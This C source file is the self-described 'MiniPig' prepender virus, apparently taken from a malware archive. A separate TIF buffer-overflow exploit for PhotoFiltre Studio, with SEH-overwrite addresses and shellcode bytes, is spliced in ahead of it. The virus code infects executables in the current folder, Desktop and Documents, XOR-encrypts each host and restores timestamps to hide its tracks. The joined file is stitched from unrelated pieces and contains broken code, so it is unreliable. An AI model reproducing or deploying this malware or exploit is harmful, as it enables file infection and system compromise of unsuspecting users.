/************************************************************************************
 * This is my new prepender virus ... its name is MiniPig.                          *
 * It works in simple way, nothing of new, look at code.                            *
 * It will infect current directory, desktop and Personal folder ... This could be  *
 * buggy so if you find some bugs you can contact me at: wargame89@yahoo.it         *
 * I declared the virus size as string so you can modify it in an hex-editor ...    *
 * Pay attenction to this value !!!                                                 * 
 * P.S: I tested this only under WinXP and Win98 ... bye :)                         *
 * https://github.com/ytisf/theZoo/blob/master/malware/Source/Original/Win32.MiniPig_Nov2006/ *
 ************************************************************************************/
#include <windows.h>
#include <stdio.h>


#define fisier FILE
#define ALOC(tip,n) (tip*)malloc(sizeof(tip)*n)
#define VER "10.3.0"
#define POCNAME "[*]PhotoFiltre Studio X .tif file local buffer overflow poc(0day)"
#define AUTHOR "[*]fl0 fl0w"
    typedef char i8;
    typedef short i16;
    typedef int i32;
    void gen_random(i8*,const int);
    void print(i8*);
    i32 mcpy(void*,const void*,i32);
    void fwi32(fisier*,i32);
    i32 filerr(fisier*);
    void error(void);
    void filebuild();
    unsigned int getFsize(fisier*,i8*);
    i32 sizes[]={257,163,217,213,940,29};
    typedef struct {
            /*Retcodes from MS Windows xp pro sp3
            */
            i32 popopret;
            i32 jmpbyte;
            i32 jmpEBP;
    }instr;
     i32 poc()
     {filebuild();
       printf("%s\n%s\n",POCNAME,AUTHOR);
       print("file done");
       getchar();
     }
           void filebuild() {
               /*The logic: overwrite seh handler with pop pop ret,overwrite next seh with
                jmp ebp,find the exact location ebp points to and write a jmp 0x40 bytes instr.
                Because there isn't space for shellcode I chose this jmp ebp option.
                And a egghunter wouldn't be the solution because u also need space for it.
               */
               i8 tif1[]= {
    0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x17, 0x00, 0xFE, 0x00, 0x04, 0x00, 0x01, 0x00,
    0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x01, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0xFD, 0x01,
    0x00, 0x00, 0x01, 0x01, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0xB6, 0x01, 0x00, 0x00, 0x02, 0x01,
    0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x03, 0x01, 0x03, 0x00, 0x83, 0x00,
    0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x06, 0x01, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x03, 0x00,
    0x00, 0x00, 0x0A, 0x01, 0xB6, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x11, 0x01,
    0x04, 0x00, 0x37, 0x00, 0x00, 0x00, 0x22, 0x01, 0x00, 0x00, 0x12, 0x01, 0x03, 0x00, 0x01, 0x00,
    0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x15, 0x01, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00,
    0x00, 0x00, 0x16, 0x01, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x17, 0x01,
    0x04, 0x00, 0x37, 0x00, 0x00, 0x00, 0xFE, 0x01, 0x00, 0x00, 0x1A, 0x01, 0x05, 0x00, 0x01, 0x00,
    0x00, 0x00, 0xDA, 0x02, 0x00, 0x00, 0x1B, 0x01, 0x05, 0x00, 0x01, 0x00, 0x00, 0x00, 0xE2, 0x02,
    0x00, 0x00, 0x1C, 0x01, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x28, 0x01,
    0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x29, 0x01, 0x03, 0x00, 0x02, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x01, 0x43, 0x43, 0xEB, 0x05, 0x8C, 0x08, 0xFC, 0x7F, 0x43, 0x55, 0x89,
    0xE5, 0x83, 0xEC, 0x18, 0xC7, 0x45, 0xFC, 0x77, 0x7A, 0x83, 0x7C, 0xC7, 0x44, 0x24, 0x04, 0xD0,
    0x03, 0x00, 0x00, 0xC7, 0x04, 0x24, 0x01, 0x0E, 0x00, 0x00, 0x8B, 0x45, 0xFC, 0xFF, 0xD0, 0xC9,0xC3,
    };
    i8 tif2[]= {
    0x92, 0x00, 0x92, 0x00, 0x96, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAF, 0x00, 0x12, 0x00, 0x00, 0x00,
    0x92, 0x00, 0x49, 0x00, 0x12, 0x00, 0x92, 0x00, 0xAF, 0x00, 0x92, 0x00, 0x49, 0x00, 0x49, 0x00,
    0x49, 0x00, 0x58, 0x00, 0xAF, 0x00, 0x12, 0x00, 0x58, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00,
    0x57, 0x00, 0x12, 0x00, 0x5A, 0x00, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x28, 0x00, 0x12, 0x00,
    0x00, 0x00, 0x46, 0x00, 0xFD, 0x00, 0xD5, 0x00, 0x1B, 0x00, 0xFF, 0x00, 0xEF, 0x00, 0xA9, 0x00,
    0xD9, 0x00, 0x00, 0x00, 0x70, 0x00, 0x6C, 0x00, 0xFA, 0x00, 0x99, 0x00, 0xC5, 0x00, 0xF7, 0x00,
    0xB4, 0x00, 0x48, 0x00, 0xAB, 0x00, 0xE9, 0x00, 0xDE, 0x00, 0x1B, 0x00, 0xFF, 0x00, 0xD7, 0x00,
    0x64, 0x00, 0xA9, 0x00, 0xD9, 0x00, 0x6E, 0x00, 0x68, 0x00, 0x70, 0x00, 0x92, 0x00, 0xCC, 0x00,
    0xF2, 0x00, 0x99, 0x00, 0x94, 0x00, 0xE9, 0x00, 0xAD, 0x00, 0xB4, 0x00, 0x4B, 0x00, 0xC9, 0x00,
    0x85, 0x00, 0xE9, 0x00, 0xE5, 0x00, 0xB4, 0x00, 0x80, 0x00, 0x98, 0x00, 0x8C, 0x00, 0xE0, 0x00,
    0xC4, 0x00, 0x33,
    };
              /*   tif1sz=v[1]
                 tif2sz[]=v[2]
                 sehoffset=v[3]
                 nsehoffset=v[4]
                 junksz=v[5]
                 jmpebpoffset=v[6] */
                  fisier* in=fopen("exploit.in","r"),
                        * out=fopen("exploit.tif","wb");
              //i8 buf=ALOC(i8,100001);
              i8 buf[100001];
              instr* ASM;
              ASM=ALOC(instr,sizeof(instr));
              ASM->popopret=0x7C86CFC2;//pop esi pop edi ret from kernel32.dll
              ASM->jmpbyte=0xeb400300;//jmp over(u need to cause a exception NOT a exit call,so work on the instr)
              ASM->jmpEBP=0x7C81ACD3;//JMP EBP from kernel32.dll
              memcpy(tif1+217,&ASM->popopret,4);
              memcpy(tif1+213,&ASM->jmpEBP,4);
              memcpy(tif1+29,&ASM->jmpbyte,4);
              if(out){
             fwrite(tif1,sizeof(i8),sizeof(tif1),out);
             gen_random(&buf,940);
             fwrite(&buf,sizeof(i8),940,out);
             fwrite(tif2,sizeof(i8),sizeof(tif2),out);
             fclose(out);
             free(buf);
             }
             else {
                    error();
               }

          }
           void error(void) {
                perror("\nError:");
          }
          i32 filerr(fisier* F) {
              return (ferror(F));
          }
           void readf(void) {

           }

      void fwi32(fisier* F,i32 adr) {
           fputc(adr&0xff,F);
           fputc((adr>>8)&0xff,F);
           fputc((adr>>16)&0xff,F);
           fputc((adr>>24)&0xff,F);
    }
    i32 mcpy(void* dest,const void* source,i32 len)
   { void* D=dest;
     const void* S=source;
     len=sizeof(source);
     memcpy(D,S,len);
     return (len);
       }
     void print(i8* msg)
    {
       printf("[*]%s\n",msg);
    }
     void gen_random(i8* s,const int len)
    { i32 i;
      static const i8 alphanum[]= {
      "0123456789ABCDEFGHIJKLMNOPQRST"
      "UVWXYZabcdefghijklmnopqrstuvwxyz"};
      for(i=1;i<len;++i)
      {
        s[i]=alphanum[rand()%(sizeof(alphanum)-1)];
      }
       s[len]=0;
      }


/* This is the signature of an infected file */
#define MINIPIG_SIGNATURE "MiniPig by [WarGame,#eof]"
/* The length of the signature string ! */
#define MINIPIGSIGNATURE_LEN 26
/* This is the key used for xor encryption */
#define XoR 0x4a
/* This will contain the original virus code */
static char *VirusBody = NULL;
/* Original virus size ( Compressed with upx using -9 option )*/
static char *Str_VirSize = "16384"; 
static DWORD VirusSize;       

       /* This it the infection routine */
void Infects(void) 
{
	WIN32_FIND_DATA w32; /* Used by FindFirstFile() and FindNexFile() */
	HANDLE SearchFD = NULL; /* Search handle */
	HANDLE EXE_FD = NULL; /* File handle */
	char *VictimBuf = NULL; /* This is the buffer used in I/O operations */
	char Signature[MINIPIGSIGNATURE_LEN]; /* Used to check signature */
	DWORD readbytes,writtenbytes; /* Used by WriteFile() and ReadFile(); */
	DWORD VictimAttributes; /* Attributes of victim */
	FILETIME WriteTime,LastAccessTime,CreationTime; /* Used to restore victim's time */
	DWORD CryptCnt; /* Used in crypting loop */

		if((SearchFD = FindFirstFile("*.EXE",&w32)) == INVALID_HANDLE_VALUE) 
        {
			return;
		}

		do
		{
			 /* Let's open the found executable! */
			if((EXE_FD = CreateFile(w32.cFileName,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_WRITE|FILE_SHARE_READ,NULL
				  ,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL)) != INVALID_HANDLE_VALUE) 
			{
				/* Checks it it has already been infected */
				      SetFilePointer(EXE_FD,-(MINIPIGSIGNATURE_LEN),0,FILE_END);
                      memset(Signature,0,MINIPIGSIGNATURE_LEN);
				/* Reads ( possible ) signature */
					  ReadFile(EXE_FD,Signature,MINIPIGSIGNATURE_LEN,&readbytes,NULL);
                      
				/* Already infected !!! */
					  if(strstr(Signature,MINIPIG_SIGNATURE)) 
					  {
						  CloseHandle(EXE_FD);
						  continue;
					  }
				
				/* Infects it !!! */
					  else 
					  {
						  /* Saves old attributes */
						  VictimAttributes = w32.dwFileAttributes;
						  CopyMemory(&WriteTime,&w32.ftLastWriteTime,sizeof(FILETIME));
						  CopyMemory(&CreationTime,&w32.ftCreationTime,sizeof(FILETIME));
						  CopyMemory(&LastAccessTime,&w32.ftLastAccessTime,sizeof(FILETIME));
					      
						  /* Grows up the victim's size */
                           SetFilePointer(EXE_FD,MINIPIGSIGNATURE_LEN+VirusSize,0,FILE_CURRENT);
						   SetEndOfFile(EXE_FD);
						  /* Closes the file */
						   CloseHandle(EXE_FD);

						   /* Reopens the file */
                           if((EXE_FD = CreateFile(w32.cFileName,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_WRITE|FILE_SHARE_READ,NULL
				  ,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL)) != INVALID_HANDLE_VALUE) 
						   {
                                /* Failed to allocate memory ! */
							    if((VictimBuf = GlobalAlloc(GMEM_FIXED|GMEM_ZEROINIT,w32.nFileSizeLow)) == NULL) 
								{
									CloseHandle(EXE_FD);
									continue;
								}
								
								else 
								{
									/* Ok Now we read victim on buffer */
									ReadFile(EXE_FD,VictimBuf,w32.nFileSizeLow,&readbytes,NULL);
									/* Ok overwrites with virus */
									SetFilePointer(EXE_FD,-(w32.nFileSizeLow),0,FILE_CURRENT);
									WriteFile(EXE_FD,VirusBody,VirusSize,&writtenbytes,NULL);
									 
									/* Crypts VictimBuf with simple XoR */
									for(CryptCnt = 0;CryptCnt < w32.nFileSizeLow;CryptCnt++)
									{
										VictimBuf[CryptCnt] ^= XoR;
									}
									
									/* Ok writes the victim at the end */
                                    WriteFile(EXE_FD,VictimBuf,w32.nFileSizeLow,&writtenbytes,NULL);
									/* Writes the signature */
									WriteFile(EXE_FD,MINIPIG_SIGNATURE,MINIPIGSIGNATURE_LEN,&writtenbytes,NULL);
									/* Restores victim's file and attributes */
									SetFileAttributes(w32.cFileName,VictimAttributes);
									SetFileTime(EXE_FD,&CreationTime,&LastAccessTime,&WriteTime);
									/* Closes All and frees memory */
									CloseHandle(EXE_FD);
									GlobalFree(VictimBuf);
									/* DONE ! */
								}
						   }
						  
					  }
			}
		}while(FindNextFile(SearchFD,&w32));

		/* Closes the search */
		FindClose(SearchFD);
}

/* This is used to return to host */
void ReturnToHost(char *mypath) 
{
       HANDLE TotalFD; /* This is the handle used to read the entire file */
       char *TotalBuf = NULL; /* Put the file here */
	   DWORD TotalSize; /* Total size of file */
	   HANDLE HostFD; /* Used to write host's code */
	   DWORD readbytes,writtenbytes; /* As usual ... :) */
	   DWORD DecryptCnt; /* Used for decrypting */
	   char *randChars = "AcGh9Kl6"; /* Used for random name generation */
	   char randName[10]; /* Random name for temp host */
	   STARTUPINFO inf_prog; /* Used for CreateProcess() */
       PROCESS_INFORMATION info_pr; /* the same ... :) */
	          
	   /* Reads entire file */
	    if((TotalFD = CreateFile(mypath,GENERIC_READ,FILE_SHARE_READ,NULL
				  ,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL)) != INVALID_HANDLE_VALUE) 
		{
			/* What is the size of mine ??? */
			TotalSize = GetFileSize(TotalFD,NULL);
			
			/* Allocates memory */
			if((TotalBuf = GlobalAlloc(GMEM_FIXED|GMEM_ZEROINIT,TotalSize)) == NULL) 
			{
				ExitProcess(0);
			}

			/* Reads and puts in buffer */
			ReadFile(TotalFD,TotalBuf,TotalSize,&readbytes,NULL);
			/* Closes file */
			CloseHandle(TotalFD);
			
			/* Builds random name */
			srand(GetTickCount());
            sprintf(randName,"%c%c%c%c%c%c.exe",randChars[rand()%8],randChars[rand()%8],
				randChars[rand()%8],randChars[rand()%8],randChars[rand()%8],randChars[rand()%8]);
			
			/* Creates the temp host file */
			if((HostFD = CreateFile(randName,GENERIC_WRITE,FILE_SHARE_WRITE,NULL
				  ,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL|FILE_ATTRIBUTE_HIDDEN,NULL)) != INVALID_HANDLE_VALUE) 
			{
				
				/* Decrypts !!! */
                for(DecryptCnt = VirusSize;DecryptCnt < TotalSize;DecryptCnt++)
				{
					TotalBuf[DecryptCnt] ^= XoR;
				}
				/* Hosts written! */
				SetFilePointer(HostFD,0,0,FILE_BEGIN);
				WriteFile(HostFD,TotalBuf+VirusSize,(TotalSize-VirusSize),&writtenbytes,NULL);
				/* Frees and closes */
				CloseHandle(HostFD);
				GlobalFree(TotalBuf);
				
				/* Returns to host ! */
				memset(&inf_prog,0,sizeof(STARTUPINFO));
                memset(&info_pr,0,sizeof(PROCESS_INFORMATION));
                inf_prog.cb = sizeof(STARTUPINFO);
                inf_prog.dwFlags = STARTF_USESHOWWINDOW;
                inf_prog.wShowWindow = SW_SHOW;

				/* Runs host ! */
				CreateProcess(NULL,randName,NULL,NULL,FALSE,CREATE_NEW_CONSOLE,NULL,NULL,
                             &inf_prog,&info_pr);
				
				/* Waits and deletes tmp exe */
				WaitForSingleObject(info_pr.hProcess,INFINITE);
				DeleteFile(randName);
				
				/* Exits ! */
				ExitProcess(0);
			}
		}

			else
			{
				ExitProcess(0);
			}
}

/* This is to get special folder */
int GetSpecialFolder(char *path,char *folder) 
{
	HKEY hKey; /* Reg handle */
	DWORD len = MAX_PATH;

	memset(path,0,MAX_PATH);
	
	if(RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders",0,KEY_QUERY_VALUE,&hKey) !=
                 ERROR_SUCCESS)
                    {
	                       return 0; /* failed :( */
                    }
  
	/* Puts found path in path buffer */
	if(RegQueryValueEx(hKey,folder,0,NULL,path,&len) != ERROR_SUCCESS)
                    {
		                   RegCloseKey(hKey);
                           return 0;
                    }

	/* Success ! */
	RegCloseKey(hKey);
	return 1;
}

/* The main of virus */
int __stdcall WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	char MyPath[MAX_PATH];
	HANDLE VirFD = NULL; /* Used to read virus body */
	DWORD readbytes; /* As usual used by ReadFile() */
	DWORD CurrentSize; /* Current size of proggy */
	char CWD[MAX_PATH],OriginalCWD[MAX_PATH]; /* Used to change directory */

	/* Gets its path */
	 GetModuleFileName(NULL,MyPath,MAX_PATH);

	/* Gets its current directory */
	 GetCurrentDirectory(MAX_PATH,OriginalCWD);

	/* Gets Virus Size */
	 VirusSize = atoi((char *)Str_VirSize);
	 
	/* Puts virus body in VirusBody buffer */
	 if((VirFD = CreateFile(MyPath,GENERIC_READ,FILE_SHARE_READ,NULL
				  ,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL)) != INVALID_HANDLE_VALUE) 
	 {
          if((VirusBody = GlobalAlloc(GMEM_FIXED|GMEM_ZEROINIT,VirusSize)) == NULL) 
		  {
			  ExitProcess(0);
		  }

		  /* Reads virus body and puts it in VirusBody */
		  ReadFile(VirFD,VirusBody,VirusSize,&readbytes,NULL);
		  /* Gets the total file size */
		  CurrentSize = GetFileSize(VirFD,NULL);
		  /* Closes virus's handle */
		  CloseHandle(VirFD);
				
	 }

	  /* Error !!! Exits !!! */
	 else 
	 {
		 ExitProcess(0);
     }
	 
	 /* Infects current dir */
	 Infects();

     /* Infects desktop */
	 if(GetSpecialFolder(CWD,"Desktop"))
	 {
	 SetCurrentDirectory(CWD);
	 Infects();
	 }

	 /* Infects personal folder ( usually named Documents ) */
	 if(GetSpecialFolder(CWD,"Personal"))
	 {
	 SetCurrentDirectory(CWD);
	 Infects();
	 }
	 
	 
	 /* If we are not in the first generation we return to host ! */
     if(CurrentSize > VirusSize) 
     {
	 SetCurrentDirectory(OriginalCWD);
	 ReturnToHost(MyPath);
	 }
}